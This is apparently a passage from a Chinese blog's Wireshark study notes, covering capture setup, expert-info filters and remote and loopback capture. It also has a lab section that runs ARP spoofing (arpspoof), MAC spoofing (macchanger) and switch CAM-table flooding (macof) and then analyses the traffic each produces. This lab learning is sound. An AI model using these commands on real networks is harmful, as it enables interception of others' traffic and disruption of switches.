srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="杂项设置"><a href="#杂项设置" class="headerlink" title="杂项设置"></a>杂项设置</h2><h3 id="wireshark-数据包颜色的意思"><a href="#wireshark-数据包颜色的意思" class="headerlink" title="wireshark 数据包颜色的意思"></a>wireshark 数据包颜色的意思</h3><p>可以通过 视图 -&gt; 着色规则进行查看<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wireshark-故障包过滤"><a href="#wireshark-故障包过滤" class="headerlink" title="wireshark 故障包过滤"></a>wireshark 故障包过滤</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>有5个等级</p><ul><li>Error 严重错误，譬如：畸形数据包或识别出数据包协议头部的某些字段和预期值不符</li><li>Warning 一般性问题（应用程序问题或通信问题），譬如：TCP zero window ,TCP window full ,TCP报文段失序，TCP报文段丢失</li><li>Note 可能引发故障的异常现象（正常行为），譬如：TCP重传，重复确认，快速重传</li><li>Chat 符合常规流量的特征，譬如：SYN,FIN,RST</li><li>Comment</li><li>OK</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_ws.expert.severity &lt;&#x3D; Note</span><br><span class="line">或者</span><br><span class="line">_ws.expert.severity &lt;&#x3D; Chat</span><br></pre></td></tr></table></figure><h3 id="查看wireshark-内置文件路径"><a href="#查看wireshark-内置文件路径" class="headerlink" title="查看wireshark 内置文件路径"></a>查看wireshark 内置文件路径</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="修改wireshark默认配置"><a href="#修改wireshark默认配置" class="headerlink" title="修改wireshark默认配置"></a>修改wireshark默认配置</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-网络分析"><a href="#Wireshark-网络分析" class="headerlink" title="Wireshark 网络分析"></a>Wireshark 网络分析</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="># Wireshark 部署方式</p><h2 id="远程数据包捕获"><a href="#远程数据包捕获" class="headerlink" title="远程数据包捕获"></a>远程数据包捕获</h2><h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1:"></a>方式1:</h3><p>开启远程桌面，rdp服务，在系统中安装wireshark进行抓包分析<br>缺点: 在于远程登录过程中，都会产生无关与目的远程连接数据流量</p><h3 id="方式2-wireshark-远程抓包"><a href="#方式2-wireshark-远程抓包" class="headerlink" title="方式2: wireshark 远程抓包"></a>方式2: wireshark 远程抓包</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>服务端: <a href="https://www.winpcap.org/install/">winpcap</a> -&gt; rpcapd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\WinPcap\&quot;</span></span><br><span class="line"><span class="string">.\rpcapd.exe -n</span></span><br></pre></td></tr></table></figure><p>客户端: wireshark<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h4 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h4><p>注意 macos 版本没有直接抓取数据包的功能，可参考<br><a href="https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/">https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/</a></p><h2 id="本地数据包捕获"><a href="#本地数据包捕获" class="headerlink" title="本地数据包捕获"></a>本地数据包捕获</h2><p>wireshark 不能抓取本地环回网卡数据包<br>不过可以使用 RawCap<br><a href="https://www.netresec.com/?page=RawCap">https://www.netresec.com/?page=RawCap</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmd</span></span><br><span class="line">RawCap.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后浏览器访问 localhost</p><p>不过可以通过访问本机 ip 代替 localhost 间接捉取数据包（狗头</p><h2 id="虚拟机数据包捕获"><a href="#虚拟机数据包捕获" class="headerlink" title="虚拟机数据包捕获"></a>虚拟机数据包捕获</h2><p>选择对应网卡即可。。。</p><p>比如在 kali 上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.18.1/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>哈哈哈哈，原来arp广播还真就这么直白，，Who has ….? Tell …（netdiscover 还真直白</p><h2 id="ARP欺骗捕获数据包"><a href="#ARP欺骗捕获数据包" class="headerlink" title="ARP欺骗捕获数据包"></a>ARP欺骗捕获数据包</h2><h3 id="攻击原则"><a href="#攻击原则" class="headerlink" title="攻击原则"></a><a href="https://blog.csdn.net/rectsuly/article/details/63261412">攻击原则</a></h3><ul><li>任何主机均能发送伪造包给局域网中的另一主机；</li><li>任一主机相信它们接受到的所有包；</li><li>当一个新的响应包到达时，它甚至在没有请求包被发送的情况下覆盖掉旧的记录。</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>kali 一般要先安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dsniff</span><br></pre></td></tr></table></figure><p>kali 上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t &lt;欺骗的目标&gt; &lt;我是谁&gt;</span><br><span class="line"><span class="comment"># 如</span></span><br><span class="line">sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后此时在 <code>192.168.123.37</code> 这台机器上wireshark 选择网卡 eth0，因为是欺骗这一张网卡，wireshark 筛选过滤器填入 <code>icmp</code> 查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 然后在 192.168.123.37 上 ping 网关</span></span><br><span class="line">ping 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>会发现 192.168.123.1 的 mac 地址是 kali的。。。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>所以在 <code>192.168.123.37</code> 上是上不了网的，除非kali上开启了数据包转发，当 <code>ip_forward</code> 为 0 时，<code>欺骗的目标</code> 上不了网，当该值为 <code>1</code> 时，会把<code>192.168.123.37</code>发送的数据包做转发给网关，就可以正常上网，但是<code>192.168.123.37</code>的数据包都会经过 kali。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-网络安全"><a href="#Wireshark-网络安全" class="headerlink" title="Wireshark 网络安全"></a>Wireshark 网络安全</h1><h2 id="链路层安全"><a href="#链路层安全" class="headerlink" title="链路层安全"></a>链路层安全</h2><h3 id="针对于交换机的安全问题"><a href="#针对于交换机的安全问题" class="headerlink" title="针对于交换机的安全问题"></a>针对于交换机的安全问题</h3><h4 id="MAC对称欺骗-——-macchange"><a href="#MAC对称欺骗-——-macchange" class="headerlink" title="MAC对称欺骗 —— macchange"></a>MAC对称欺骗 —— macchange</h4><p>擦除只是暂时的，不是覆盖原来的mac地址，机器重启后就会恢复。<br>通过MAC地址欺骗达到隐藏真实主机的目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-e 改变的是后三字节，即不改变生产厂商</span><br><span class="line">-a 同一类型的随机供应商地址 ( macchanger --list=Huawei 就是同一类型 )</span><br><span class="line">-A 随机厂商随机地址</span><br><span class="line">-p 永久修改</span><br><span class="line">-r 完全随机</span><br><span class="line">-l 查看支持的厂商</span><br><span class="line">-b</span><br><span class="line">-m</span><br></pre></td></tr></table></figure><p>设置前需要关闭网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig eth0 down</span><br><span class="line"><span class="comment"># -m 不能自己完全随意起，如果前三字节不符合 mac 地址命名规范会报错</span></span><br><span class="line"><span class="comment"># [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested address</span></span><br><span class="line">sudo macchanger -m 00:90:d1:33:33:33 eth0</span><br><span class="line">sudo ifconfig eth0 up</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>随机化设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo macchanger -r eth0</span><br></pre></td></tr></table></figure><h3 id="MAC地址泛洪分析-——-溢出交换机CAM表"><a href="#MAC地址泛洪分析-——-溢出交换机CAM表" class="headerlink" title="MAC地址泛洪分析 —— 溢出交换机CAM表"></a>MAC地址泛洪分析 —— 溢出交换机CAM表</h3><p>交换机之所以可以交换数据，是因为交换机在内存中维护着一张CAM表，即 端口 &lt;-&gt; MAC地址<br>当表被添满时，其他主机就无法在对应的端口正常交互数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo macof -h</span><br><span class="line"><span class="comment"># -x 源端口 -y 目的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泛洪</span></span><br><span class="line">sudo macof -i eth0</span><br></pre></td></tr></table></figure><h4 id="wireshark-抓包分析"><a href="#wireshark-抓包分析" class="headerlink" title="wireshark 抓包分析"></a>wireshark 抓包分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>因为实际中，主要数据包类型是 tcp 或 udp<br>下面只有 ip 数据包，因此很可能有问题（当然有问题，哈哈<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>很多无关的 ip 以及 mac地址，数据包很小<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" 